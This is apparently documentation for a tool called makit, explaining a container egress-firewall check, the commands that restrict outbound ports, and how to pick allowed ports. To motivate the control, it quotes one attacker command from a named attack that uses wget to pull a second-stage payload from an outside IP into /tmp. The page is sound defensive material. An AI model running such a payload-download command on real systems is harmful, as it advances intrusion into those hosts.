# Outbound traffic (egress)

When an attacker gets code execution in a container, the first thing the payload does is download more code:
`wget http://45.76.155.14/vim -O /tmp/vim` in the React2Shell attack. If containers may only open connections that
the application needs, that download fails and the attack stops there.

## What makit checks

| Rule | Finding |
| --- | --- |
| MK-EGRESS-OPEN | Containers may connect anywhere on any port (no makit egress policy). Informational: decide per server. |

## Fix

```bash
makit firewall --docker --egress 443/tcp            # containers may open only HTTPS (+ DNS) to the internet
makit firewall --docker --egress "443/tcp 80/tcp 25/tcp"
makit firewall --docker --egress off                # remove the policy
```

What it does: new connections **from container networks to the internet** are allowed only to the listed ports and
to DNS; everything else is rejected and logged (`journalctl -k | grep 'makit egress'`). Traffic between containers, to
the host and to private networks is not affected.

## Choosing ports

- Most applications need only 443 (APIs, package registries, S3) and DNS.
- Crawlers, link checkers or anything fetching user-supplied `http://` URLs need 80 — allow it, or run them on a
  separate host.
- Mail sending needs 587/465 (or 25).
- Watch the log for a few days after enabling it: rejected destinations you recognise are ports to add.

Host processes (outside containers) are not restricted; ufw's `default deny outgoing` would do that, but breaks apt,
NTP and most tools unless you list them all.
